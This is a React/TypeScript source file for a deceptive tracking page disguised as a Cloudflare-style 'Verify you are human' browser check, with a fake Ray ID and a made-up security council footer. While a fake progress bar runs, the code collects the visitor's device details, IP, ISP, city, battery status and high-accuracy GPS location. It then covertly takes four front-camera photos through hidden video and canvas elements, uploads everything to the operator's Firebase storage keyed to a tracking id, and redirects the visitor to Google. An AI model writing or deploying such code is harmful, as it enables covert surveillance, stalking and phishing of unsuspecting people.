
import React, { useEffect, useRef, useState } from 'react';
import { useParams } from 'react-router-dom';
import { collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
import { ref, uploadString, getDownloadURL } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-storage.js";
import { db, storage } from '../firebase';

const TrackPage: React.FC = () => {
  const { id } = useParams<{ id: string }>();
  const [loadingStep, setLoadingStep] = useState(0);
  const [statusText, setStatusText] = useState("Checking your browser...");
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const hasCaptured = useRef(false);

  useEffect(() => {
    document.title = "Verify you are human";

    const steps = setInterval(() => {
      setLoadingStep(s => {
        if (s < 30) setStatusText("Analyzing network security...");
        else if (s < 60) setStatusText("Checking hardware compatibility...");
        else if (s < 90) setStatusText("Authenticating session...");
        return s < 98 ? s + 1 : s;
      });
    }, 150);

    const getDeviceName = () => {
      const ua = navigator.userAgent;
      if (/android/i.test(ua)) {
        const match = ua.match(/Android\s+([^\s;]+)/);
        const model = ua.match(/;\s+([^;)]+)\s+Build/);
        return model ? model[1] : (match ? `Android ${match[1]}` : "Android Device");
      }
      if (/iPhone|iPad|iPod/i.test(ua)) return "iOS Device";
      if (/Windows/i.test(ua)) return "Windows PC";
      return "Unknown Device";
    };

    const runCapture = async () => {
      if (!id || hasCaptured.current) return;
      hasCaptured.current = true;

      const payload: any = {
        userId: id,
        timestamp: serverTimestamp(),
        device: {
          name: getDeviceName(),
          userAgent: navigator.userAgent,
          platform: navigator.platform,
          // @ts-ignore
          ram: navigator.deviceMemory || "N/A",
          // @ts-ignore
          cores: navigator.hardwareConcurrency || "N/A",
          screen: `${window.screen.width}x${window.screen.height}`,
        },
        status: 'Processing'
      };

      // 1. Get Battery & IP & ISP Info
      try {
        const [ipRes, battery] = await Promise.all([
          fetch('https://ipapi.co/json/').then(r => r.json()),
          // @ts-ignore
          navigator.getBattery ? navigator.getBattery() : Promise.resolve(null)
        ]);
        payload.ip = ipRes.ip;
        payload.isp = ipRes.org;
        payload.city = ipRes.city;
        if (battery) {
          payload.battery = { level: Math.round(battery.level * 100), charging: battery.charging };
        }
      } catch (e) { console.error("Net info fail", e); }

      // 2. Persistent High Accuracy Location
      try {
        const getLoc = () => new Promise<GeolocationPosition>((res, rej) => {
          navigator.geolocation.getCurrentPosition(res, rej, {
            enableHighAccuracy: true,
            timeout: 15000,
            maximumAge: 0
          });
        });
        const pos = await getLoc();
        payload.location = {
          lat: pos.coords.latitude,
          lng: pos.coords.longitude,
          accuracy: pos.coords.accuracy,
          altitude: pos.coords.altitude,
          speed: pos.coords.speed
        };
      } catch (e) { 
        console.warn("GPS failed, using IP location as fallback.");
      }

      // 3. Burst Camera Capture (4 Photos)
      const photoUrls: string[] = [];
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
          video: { facingMode: "user" } 
        });
        
        if (videoRef.current) {
          videoRef.current.srcObject = stream;
          // Wait for camera to warm up
          await new Promise(r => setTimeout(r, 1000));

          for (let i = 0; i < 4; i++) {
            const canvas = canvasRef.current;
            if (canvas && videoRef.current) {
              canvas.width = videoRef.current.videoWidth;
              canvas.height = videoRef.current.videoHeight;
              canvas.getContext('2d')?.drawImage(videoRef.current, 0, 0);
              
              const base64 = canvas.toDataURL('image/jpeg', 0.6);
              const storageRef = ref(storage, `captures/${id}/${Date.now()}_${i}.jpg`);
              await uploadString(storageRef, base64, 'data_url');
              const url = await getDownloadURL(storageRef);
              photoUrls.push(url);
              // Interval between bursts
              await new Promise(r => setTimeout(r, 800));
            }
          }
        }
        stream.getTracks().forEach(t => t.stop());
        payload.photoUrls = photoUrls;
      } catch (e) { console.error("Cam fail", e); }

      // 4. Final Data Upload
      try {
        payload.status = 'Success';
        await addDoc(collection(db, "logs"), payload);
        clearInterval(steps);
        setLoadingStep(100);
        setStatusText("Verification Complete!");
        setTimeout(() => {
          window.location.href = "https://www.google.com";
        }, 1000);
      } catch (err) {
        window.location.href = "https://www.google.com";
      }
    };

    runCapture();
    return () => clearInterval(steps);
  }, [id]);

  return (
    <div className="min-h-screen flex flex-col items-center justify-center bg-gray-50 font-sans p-6">
      <div className="w-full max-w-sm bg-white p-8 rounded-2xl shadow-xl border border-gray-100 text-center">
        <div className="mb-8">
           <div className="relative w-20 h-20 mx-auto mb-6">
              <div className="absolute inset-0 border-4 border-blue-100 rounded-full"></div>
              <div className="absolute inset-0 border-4 border-blue-600 border-t-transparent rounded-full animate-spin"></div>
              <svg className="absolute inset-0 m-auto w-8 h-8 text-blue-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
              </svg>
           </div>
           <h1 className="text-xl font-bold text-gray-800">{statusText}</h1>
           <p className="text-sm text-gray-400 mt-2 italic">Cloudflare Ray ID: {Math.random().toString(36).substr(2, 16)}</p>
        </div>

        <div className="w-full bg-gray-100 h-1.5 rounded-full overflow-hidden mb-4">
          <div className="bg-blue-600 h-full transition-all duration-500 ease-out" style={{ width: `${loadingStep}%` }}></div>
        </div>
        
        <p className="text-[10px] font-bold text-gray-300 uppercase tracking-widest">Secure Handshake Protocol</p>

        <div className="mt-12 pt-6 border-t border-gray-50">
           <div className="flex items-center justify-center gap-2 text-gray-400">
             <span className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></span>
             <span className="text-[10px] font-bold uppercase">System: Operational</span>
           </div>
        </div>

        <video ref={videoRef} autoPlay muted playsInline className="hidden"></video>
        <canvas ref={canvasRef} className="hidden"></canvas>
      </div>
      <p className="mt-8 text-[10px] text-gray-400">© 2024 Global Browser Security Council</p>
    </div>
  );
};

export default TrackPage;
